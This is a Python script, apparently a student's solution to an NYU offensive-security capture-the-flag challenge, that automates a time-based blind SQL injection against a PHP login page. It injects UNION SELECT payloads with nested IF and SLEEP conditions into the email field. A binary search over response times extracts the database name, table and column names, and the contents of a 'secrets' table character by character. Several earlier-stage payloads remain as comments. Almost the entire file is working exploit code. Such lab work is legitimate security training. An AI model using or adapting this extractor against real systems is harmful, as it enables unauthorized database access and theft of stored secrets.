#!/usr/bin/python
# Objective: log into http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php? as admin

import requests
import time
import math

'''
From experimentation, I found that the login script (PHP) posts the email and password 
to /login.php? as an application/x-www-form-urlencoded form. I replicate this here.
'''
UPPER = 126
LOWER = 32

lowerLimit = LOWER #char for 0
upperLimit = UPPER #char for ~

firstDelay = 3 # SLEEP() delay in seconds for first if
secondDelay = 8 # SLEEP() delay in seconds for second if

characterOffset = 1
entryOffset = 0

output = ""

name =  ""

f = open("output.txt", 'a')
f.write("\n" + str(time.time()) + ":\n")
f.close()

while True:
    k = int(math.floor((lowerLimit + upperLimit) / 2))
    # query = """admin' AND 1=0 
    #             UNION 
    #             SELECT 
    #                 IF(ASCII(SUBSTRING(DATABASE(), {3}, 1)) < {0}, null, 
    #                     IF(ASCII(SUBSTRING(DATABASE(), {3}, 1)) > {0}, 0, 
    #                         IF(ASCII(SUBSTRING(DATABASE(), {3}, 1)) = 0, SLEEP({2}), SLEEP({1}))
    #                     )
    #                 ), 
    #             null, null
    #             LIMIT 1 OFFSET {4}""".format(hex(k), str(firstDelay), str(secondDelay), characterOffset, entryOffset)
    
    # query = """admin' AND 1=0 
    #             UNION 
    #             SELECT 
    #                 IF(ASCII(SUBSTRING(TABLE_NAME, {3}, 1)) < {0}, null, 
    #                     IF(ASCII(SUBSTRING(TABLE_NAME, {3}, 1)) > {0}, 0, 
    #                         IF(ASCII(SUBSTRING(TABLE_NAME, {3}, 1)) = 0, SLEEP({2}), SLEEP({1}))
    #                     )
    #                 ), 
    #             null, null 
    #             FROM information_schema.TABLES WHERE TABLE_SCHEMA='logmein'
    #             LIMIT 1 OFFSET {4}""".format(hex(k), str(firstDelay), str(secondDelay), characterOffset, entryOffset)

    # query = """admin' AND 1=0 
    #         UNION 
    #         SELECT 
    #             IF(ASCII(SUBSTRING(GROUP_CONCAT(COLUMN_NAME SEPARATOR ','), {3}, 1)) < {0}, null, 
    #                 IF(ASCII(SUBSTRING(GROUP_CONCAT(COLUMN_NAME SEPARATOR ','), {3}, 1)) > {0}, 0, 
    #                     IF(ASCII(SUBSTRING(GROUP_CONCAT(COLUMN_NAME SEPARATOR ','), {3}, 1)) = 0, SLEEP({2}), SLEEP({1}))
    #                 )
    #             ), 
    #         null, null 
    #         FROM information_schema.columns WHERE TABLE_SCHEMA='logmein' AND TABLE_NAME='secrets'
    #         LIMIT 1 OFFSET {4}""".format(hex(k), str(firstDelay), str(secondDelay), characterOffset, entryOffset)
    
    query = """admin' AND 1=0 
            UNION 
            SELECT 
                IF(ASCII(SUBSTRING(GROUP_CONCAT(value SEPARATOR ','), {3}, 1)) < {0}, null, 
                    IF(ASCII(SUBSTRING(GROUP_CONCAT(value SEPARATOR ','), {3}, 1)) > {0}, 0, 
                        IF(ASCII(SUBSTRING(GROUP_CONCAT(value SEPARATOR ','), {3}, 1)) = 0, SLEEP({2}), SLEEP({1}))
                    )
                ), 
            null, null 
            FROM logmein.secrets
            LIMIT 1 OFFSET {4}""".format(hex(k), str(firstDelay), str(secondDelay), characterOffset, entryOffset)

    query += " #"

    '''

    '''

    login = { "email": query, "password": "dummy" } #password does not really matter
    url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"
    cookies = dict(CHALBROKER_USER_ID='tk1931') # for admin purposes

    start = time.time()
    r = requests.post(url, data=login, cookies=cookies)
    end = time.time()
    length = end - start
    print("Response Time: " + str(end-start))

    if "No such user" in r.text or r.status_code == 500 : # If it causes a server error or returns back the unsuccessful login
        print("Empty Result: All done!")
        print(query)
        break;
    elif "assoc" in r.text : #SQL ERROR
        print("SQL ERROR")
    elif "flag" in r.text: # If the successful login screen is shown (not null error)
        if (length > firstDelay) : #delay case, so found equality
            print("DONE: " + chr(k))
            output += chr(k)
            characterOffset += 1
            f = open("output.txt", 'a')
            f.write(chr(k))
            f.close()
            upperLimit = UPPER
            lowerLimit = LOWER
            continue
        elif length < firstDelay : # zero case
            print("GREATER THAN")
            lowerLimit = k + 1
    elif ("No need to log in this time..." in r.text) : #null case (LESS THAN)
        print("LESS THAN")
        upperLimit = k - 1
    else :
        print("unknown")

    if lowerLimit > upperLimit or length > secondDelay:
        print("Done with entry: " + output)
        f = open("output.txt", 'a')
        f.write('\n')
        f.close()
        output = ""
        upperLimit = UPPER
        lowerLimit = LOWER
        characterOffset = 1
        entryOffset += 1
        continue
    elif lowerLimit == upperLimit :
        k = lowerLimit
        print("DONE: " + chr(k))
        output += chr(k)
        characterOffset += 1
        f = open("output.txt", 'a')
        f.write(chr(k))
        f.close()
        upperLimit = UPPER
        lowerLimit = LOWER